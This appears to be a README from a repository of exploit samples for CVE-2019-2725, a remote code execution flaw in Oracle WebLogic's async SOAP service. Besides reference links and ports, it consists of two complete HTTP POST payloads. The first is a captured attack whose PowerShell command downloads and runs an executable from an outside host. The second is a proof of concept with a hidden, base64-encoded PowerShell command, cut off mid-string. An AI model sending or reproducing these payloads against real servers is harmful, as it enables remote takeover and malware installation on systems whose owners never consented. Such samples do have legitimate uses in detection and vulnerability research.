CVE-2019-2725/README.md

# CVE-2019-2725

# Links:
https://www.exploit-db.com/exploits/46814
https://www.exploit-db.com/exploits/46780
https://www.virustotal.com/gui/file/6180a1db3b1267eec5fba215be7696435bcb746a34b3b8692c99554e9edbe68b/detection

# Protocols:
TCP

# Ports:
7001
80

# Sample:

```
POST /_async/AsyncResponseService HTTP/1.1
Connection: Keep-Alive
Content-Type: text/xml; Charset=UTF-8
Accept: */*
Accept-Language: zh-cn
Referer: http://206.189.170.92:7001/_async/AsyncResponseService
User-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)
Upgrade-Insecure-Requests: 1
Content-Length: 913
Host: 206.189.170.92:7001

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/tsrokfrmhcyuqla9834.exe');start %SystemRoot%/Temp/tsrokfrmhcyuqla9834.exe</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```

#PoC
```
POST /_async/AsyncResponseServiceHttps HTTP/1.1
Host: 192.168.11.134:7001
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Accept-Language: en
Content-Type: text/xml
Content-Length: 7263

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
    <soapenv:Header>
        <wsa:Action>xx</wsa:Action>
        <wsa:RelatesTo>xx</wsa:RelatesTo>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <void class="java.lang.ProcessBuilder">
                <array class="java.lang.String" length="3">
                    <void index="0">
                        <string>cmd</string>
                    </void>
                    <void index="1">
                        <string>/c</string>
                    </void>
                    <void index="2">
                        <string>%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTA
```
